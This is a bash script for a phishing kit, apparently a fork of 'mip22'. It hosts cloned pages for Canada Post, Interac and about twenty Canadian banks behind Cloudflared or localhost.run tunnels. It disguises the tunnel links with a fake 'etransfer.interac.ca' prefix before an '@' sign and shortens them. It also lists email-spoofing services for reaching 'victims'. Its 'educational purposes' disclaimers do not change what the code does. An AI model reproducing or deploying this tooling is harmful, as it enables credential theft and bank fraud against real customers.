#!/bin/bash

#permissions

chmod -R 777 packages.sh
chmod -R 777 tunnels.sh
chmod -R 777 .host
chmod -R 777 .pages
chmod -R 777 .tunnels_log
chmod -R 777 /.www



#Install packages and tunnels

check_os_and_install_packages() {


if [[ -f .host/ngrok && -f .host/cloudflared ]]; then

{ clear; }

else

{ clear; header; }

OS_SYSTEM=$(uname -o)
if [ $OS_SYSTEM != Android ]; then
     bash packages.sh
     bash tunnels.sh

else
 ./packages.sh
 ./tunnels.sh
 
fi

fi

}


# Check os for root

check_root_and_os() {

OS_SYSTEM=$(uname -o)

if [ $OS_SYSTEM != Android ]; then


if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    { clear; header; }
    echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
    exit 1
fi

fi


}



# Terminal Colors

RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"

ORANGEBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"



# Directories
if [[ ! -d ".host" ]]; then
mkdir -p ".host"
fi

if [[ ! -d "/.www/" ]]; then
mkdir -p "/.www/"
fi



# Clear content of log files

truncate -s 0 .tunnels_log/.cloudfl.log 

truncate -s 0 .tunnels_log/.localrun.log 




pid_kill() {

#kill all pid for php, ngrok and cloudflared
if [[ `pidof php` ]]; then
killall php > /dev/null 2>&1
fi
if [[ `pidof ngrok` ]]; then
killall ngrok > /dev/null 2>&1
fi
if [[ `pidof cloudflared` ]]; then
killall cloudflared > /dev/null 2>&1
fi

}


header(){

    printf "${BLUE}"
cat <<- EOF

8 
${RED}   Your either Happenin or your Cappin.. bro 
${RED}   MADE IN +41 TO FUND MEXICAN JAILS WITH POUTINE                                                                                      
${WHITE}  █████████  █████  ${RED}██████ ${WHITE}  █████  ██  ██ 
${WHITE}    ██      ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██ 
${WHITE}    ███████ ██ █ ██ ${RED}█████  ${WHITE} ██ █ ██ ██████ 
${WHITE}         ██ ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██
${WHITE}  █████████ ██ ${GREEN}NO${RED}-${GREEN}IM${RED}-${GREEN}NOT${RED}-${GREEN}ANOTHER${RED}-${GREEN}AI${RED}-${GREEN}BOT${WHITE} ██     
 ${ORANGE}[!]  FOR EDUCATIONAL PURPOSES ONLY!  ${WHITE}  ██ 
${CYAN}THE DEVELOPER IS NOT RESPONSIBLE FOR ANYTHING...


EOF

printf "${RESETBG}"
}



log_info(){

bold=$(tput bold)
    normal=$(tput sgr0)

    printf "${GREEN}"
cat <<- EOF

$bold                            _       _                
$bold  |   _   _  o ._    o ._ _|_ _    |_ _      ._   _| 
$bold  |_ (_) (_| | | |   | | | | (_)   | (_) |_| | | (_| 
$bold          _|                                     


EOF

printf "${RESETBG}"
}



# Php webserver and port 
host='127.0.0.1'
port='8080'


setup_clone(){

    # Setup cloned page and server
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
rm -rf .www/*
cp -rf .pages/"$site"/* /.www/
echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
cd /.www/ && php -S "$host":"$port" > /dev/null 2>&1 & 
}



setup_clone_manual() {

   rm -rf .www/*
   
   cp -rf .manual_attack/index.html /.www/
   cp -rf .manual_attack/post.php /.www/
   cp -rf .manual_attack/__ROOT__/index.php /.www/
   cp -rf .manual_attack/__ROOT__/fingerprints.php /.www/
   
   
   rm -rf .manual_attack/index.html
   rm -rf .manual_attack/post.php
   rm -rf .manual_attack/data.txt
   
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
   cd /.www/ && php -S "$host":"$port" > /dev/null 2>&1 & 
}



setup_clone_customize(){

    # Setup cloned page and server
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
rm -rf /.www/*
cp -rf .customize/"$site"/* /.www/
echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
cd /.www/ && php -S "$host":"$port" > /dev/null 2>&1 & 
}





















# Localhost Start
localhost_start() {
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
setup_clone
{ sleep 1; clear; header; }
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
credentials
}



# Localhost Start customize
localhost_customize() {
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
setup_clone_customize
{ sleep 1; clear; header; }
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
credentials
}



# Localhost Start manual
localhost_start_manual() {
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
setup_clone_manual
{ sleep 1; clear; header; }
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
credentials_manual
}









# Start Cloudflared
cloudflared_start() { 

echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
{ sleep 1; setup_clone; }
echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

{ sleep 12; clear; header; }

cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
cldflr_url1=${cldflr_url#https://}

url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")

echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"


}





# Start Cloudflared customize
cloudflared_start_customize() { 

echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
{ sleep 1; setup_clone_customize; }
echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

{ sleep 12; clear; header; }

cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
cldflr_url1=${cldflr_url#https://}

url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")

echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"


}





# Start Cloudflared manual
cloudflared_start_manual() { 
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
{ sleep 1; setup_clone_manual; }
echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

{ sleep 12; clear; header; }

cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
cldflr_url1=${cldflr_url#https://}

url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")

echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"


}






# Start localrun
localhostrun_start() {
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
{ sleep 1; setup_clone; }
echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

{ sleep 9; clear; header; }

localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
localrun_url1=${localrun_url#https://}

url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")

    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"


}




# Start localrun customize
localhostrun_start_customize() {
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
{ sleep 1; setup_clone_customize; }
echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

{ sleep 9; clear; header; }

localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
localrun_url1=${localrun_url#https://}

url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")

    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"


}




# Start localrun manual
localhostrun_start_manual() {
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
{ sleep 1; setup_clone_manual; }
echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

{ sleep 9; clear; header; }

localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
localrun_url1=${localrun_url#https://}

url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")

echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"


}






# Select Tunnel  
tunnel() {
{ clear; header; }
cat <<- EOF
${GREEN}[${WHITE}1${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)


EOF

read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

case $REPLY in 
   1)
cloudflared_start;;
  *)
echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
{ sleep 1; header; tunnel;};;
esac

}



start_manual_method() {
 
 cd .manual_attack && php -S "127.0.0.1:8081" > /dev/null 2>&1 & 
     echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} Visit ${WHITE} http://127.0.0.1:8081 ${GREEN} for setup clone page "${WHITE}
 echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} After setup clone page return to here and continue... "${WHITE}

}


# Select Tunnel  
tunnel_manual() {
{ clear; header; }
 

 start_manual_method

cat <<- EOF

${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)  
${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)    

EOF

read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

case $REPLY in 
   1)
    localhost_start_manual;;
    
   2)
    localhostrun_start_manual;; 

   3)
cloudflared_start_manual;;

   4)
ngrok_start_manual;;
   

  *)
echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
{ sleep 1; header; tunnel_manual;};;
esac

}






attack() {
 
 { clear; header; echo; }

cat <<- EOF
${RED}[///////][${CYAN}LIST-1${WHITE}CUSTOM AI0  PROGRAMS${RED}]${RED}[///////]
${RED}[+] 
${RED}[+] [1] SARAH AIO MAIN     
${RED}[+] 
${RED}[//////////////////////][${CYAN}LIST 2 =${WHITE}CUSTOM ${CYAN}]${RED}
${GREEN}[${WHITE}2${GREEN}]${CYAN}${TEAL}CANADA-POST   MAILER ${RED} [NO LOGIN REQUIRIED]
${GREEN}[${WHITE}3${GREEN}]${CYAN}${TEAL}TRANSGENDER   MAILER ${RED} [NO LOGIN REQUIRIED]   
${GREEN}[${WHITE}4${GREEN}]${CYAN}${TEAL}INTERAC-ATM        ${WHITE} [NO LOGIN REQUIRIED] 
${GREEN}[${WHITE}5${GREEN}]${CYAN}${TEAL}CANADAPOST       ${WHITE}   [NO LOGIN REQUIRIED]
${GREEN}[${WHITE}6${GREEN}]${CYAN}${RED}META GENERATOR   ${WHITE}   [NO LOGIN REQUIRIED]  
${GREEN}[${WHITE}7${GREEN}]${CYAN}${RED}PHISHNG KIT MASTER ${WHITE} [NO LOGIN REQUIRIED]
${GREEN}[${WHITE}8${GREEN}]${CYAN}${RED}BANK MAILER     ${WHITE}    [OTHER BONUS THINGS]
${GREEN}[${WHITE}9${GREEN}]${CYAN}${RED}MAIN MENU        ${WHITE}   [OTHER BONUS THINGS]


EOF


read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

case $REPLY in 

    2)
site="CANADAPOST-MAILER"
tunnel;;


    5)
site="CANADAPOST"
tunnel;;


    1)
site="SARAG"
tunnel;;


        5)
site="META"
tunnel;;


2)
site="TRANSGENDER-MAILER"
tunnel;;


    6)
site="INTERAC-ATM"
tunnel;;
 
 
    7)
site="KITZ"
tunnel;;

   8)  

        other_sites;;
        
        
   9)  menu;;
    
        
   *)
echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
{ sleep 0.7; attack;};;
  
esac


}




other_sites() {
 
 { clear; header; echo; }

   cat <<- EOF
	
${GREEN}[${WHITE}1${GREEN}]${CYAN} Scotia Bank			
${GREEN}[${WHITE}2${GREEN}]${CYAN} Bank of Montreal			
${GREEN}[${WHITE}3${GREEN}]${CYAN} CIBC
${GREEN}[${WHITE}4${GREEN}]${CYAN} RBC Royal Bank			
${GREEN}[${WHITE}5${GREEN}]${CYAN} ATB Financial			
${GREEN}[${WHITE}6${GREEN}]${CYAN} TD Canada Trust			
${GREEN}[${WHITE}7${GREEN}]${CYAN} National Bank of Canada			
${GREEN}[${WHITE}8${GREEN}]${CYAN} Desjardins		
${GREEN}[${WHITE}9${GREEN}]${CYAN} Laurentian Bank of Canada		
${GREEN}[${WHITE}10${GREEN}]${CYAN} Manulife Bank of Canada	
${GREEN}[${WHITE}11${GREEN}]${CYAN} Tangerine Bank	
${GREEN}[${WHITE}12${GREEN}]${CYAN} Alterna Bank		
${GREEN}[${WHITE}13${GREEN}]${CYAN} Bridgewater Bank	
${GREEN}[${WHITE}14${GREEN}]${CYAN} Canadian Tire Bank	
${GREEN}[${WHITE}15${GREEN}]${CYAN} Equitable Bank		
${GREEN}[${WHITE}16${GREEN}]${CYAN} Meridian Financial	
${GREEN}[${WHITE}17${GREEN}]${CYAN} Haventree Bank		
${GREEN}[${WHITE}18${GREEN}]${CYAN} Motus
${GREEN}[${WHITE}19${GREEN}]${CYAN} Peoples Trust Company	 
${GREEN}[${WHITE}20${GREEN}]${CYAN} Simplii Financial		
${GREEN}[${WHITE}21${GREEN}]${CYAN} Vancity			
                                          
EOF


read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

case $REPLY in 

    1)
site="BANKMAILER/scotia"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;


    2)
site="BANKMAILER/bmo"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;

   
    3)
site="BANKMAILER/cibc"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
   
   
    4)
site="BANKMAILER/rbc"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
   
   
    5)
site="BANKMAILER/atb"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
           
           
    6)
site="BANKMAILER/td"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
  
  
    7)
site="BANKMAILER/hsbc"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
           
           
    8)
site="BANKMAILER/nbc"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
           
    
    9)
site="BANKMAILER/desj"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
           
    
    10)
site="BANKMAILER/laur"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
           
    
    11)
site="BANKMAILER/manu"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
            
            
    12)
site="BANKMAILER/tang"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
   
   
    13)
site="BANKMAILER/alterna"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;       
     
     
    14)
site="BANKMAILER/bridgewater"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;

    15)
site="BANKMAILER/eq"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;

    16)
site="BANKMAILER/meridian"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;

    17)
site="BANKMAILER/motus"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;

    18)
site="BANKMAILER/simplii"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;
    19)
site="BANKMAILER/yelp"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;

    20)
site="BANKMAILER/van"
subdomain='http://etransfer.interac.ca/RP=DO?=43645EF5ZCAZZ4W5CSE4'
tunnel;;


           
        
   99) menu;;
    
        
   *)
echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
{ sleep 0.7; other_sites;};;
  
esac


}





customize_sites()
{

 { clear; header; echo; }
 
   
echo -ne "\n${MAGENTA}Customize your sites. 
${GREEN}Go inside the .customize folder \nand create your own customized sites inside folders.
Place all your files inside the same folder. 
For example folder mysite and inside all files. 
Then just type the folder name and choose tunnel. \n\n"
    
     
cat <<- EOF
        
${GREEN}[${WHITE}1${GREEN}]${CYAN} Customized 
${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu

EOF

    read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

case $REPLY in 
    
    1) 
      read -p ${CYAN}"Enter folder name e.x mysite: "${WHITE} customize_folder
      read -p ${CYAN}"Enter subdomain for tunnel e.x mysite-update-plan-premium-free: "${WHITE} customize_subdomain
      site=$customize_folder
      subdomain=$customize_subdomain
      tunnel_customize;;

    
    99) 
       menu;; 
    
    *)
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
{ sleep 0.7; attack_customize;};;
  
esac

}






attack_manual() {

 subdomain='http:secure-login-page'
 tunnel_manual
  
}




email() {

{ clear; header; echo; }

    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Use this services for send email to Victims \n"
   
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https:/.www/.guerrillamail.com/ \n"
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://emkei.cz/ ${MAGENTA} (recommended) \n"
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://mailspre.com/ \n"
    echo -ne "\n\n"
    
    
    cat <<- EOF
${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu


EOF

read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

case $REPLY in 
    
    99) menu;; 
    
    *)
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
{ sleep 0.7; email;};;
  
esac




}




menu() {
 
 { clear; header; echo; }

cat <<- EOF
${GREEN}[${WHITE}1${GREEN}]${CYAN} I COMMIT AND UNDERSTAND THAT USE OF THIS PROGRAM IS ONLY FOR EDUCTATIONAL PURPOSES ONLY 

${GREEN}[${WHITE}0${GREEN}]${ORANGE} Exit


EOF

read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

case $REPLY in 
    
    1) attack;; 
    
    2) attack_manual;; 
    
    3) customize_sites;;
      
    4) apis;;
    
    5) email;;
    
    6) vpn_setup;;
    
    7) play_music;;
    
    help) help;;
      
0)
echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using mip22 "${WHITE}
sleep 2
clear
exit 1;;

    *)
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
{ sleep 0.7; menu;};;
  
esac

}


control_c()
{
  echo -e "${RESETBG}"
  echo -e "${RESETFG}"
  clear
  exit 1
}


trap control_c SIGINT



check_os_and_install_packages
check_root_and_os
pid_kill
menu
